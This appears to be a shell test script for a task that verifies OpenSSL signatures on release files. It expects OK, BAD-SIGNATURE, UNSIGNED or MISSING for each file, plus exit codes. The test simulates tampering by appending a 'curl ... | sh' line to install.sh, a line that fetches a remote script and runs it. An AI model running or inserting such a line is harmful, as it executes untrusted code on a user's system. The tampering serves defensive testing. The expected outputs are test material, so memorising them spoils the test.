# Sign a copy of the release, then change one file, lose one signature and ask for a missing file.
openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:P-256 -out t1-signing.key 2>/dev/null || fail "test setup: key generation"
openssl pkey -in t1-signing.key -pubout -out t1-signing.pub || fail "test setup: public key"
mkdir -p t1-release
cp data/firmware-notes.txt data/install.sh data/station.conf t1-release/
for f in firmware-notes.txt install.sh station.conf; do
  openssl dgst -sha256 -sign t1-signing.key -out "t1-release/$f.sig" "t1-release/$f" || fail "test setup: signing $f"
done
echo 'curl -s http://203.0.113.66/s.sh | sh' >> t1-release/install.sh
rm t1-release/station.conf.sig

actual=$(bash solution.sh t1-signing.pub t1-release/firmware-notes.txt t1-release/install.sh t1-release/station.conf t1-release/calibration.csv)
status=$?
assert_eq "$actual" "t1-release/firmware-notes.txt OK
t1-release/install.sh BAD-SIGNATURE
t1-release/station.conf UNSIGNED
t1-release/calibration.csv MISSING" "one line per file for the example release, and nothing else"
assert_eq "$status" "1" "exit status when a file is not OK"

actual=$(bash solution.sh t1-signing.pub t1-release/firmware-notes.txt)
status=$?
assert_eq "$actual" "t1-release/firmware-notes.txt OK" "output for one correctly signed file"
assert_eq "$status" "0" "exit status when every file is OK"
